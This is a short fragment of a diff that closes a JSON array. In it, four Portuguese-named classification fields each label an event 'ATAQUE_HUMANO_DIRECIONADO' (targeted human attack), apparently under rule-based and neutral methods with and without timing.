+    "classificacao_regras_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_regras_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO"
+  }
+]
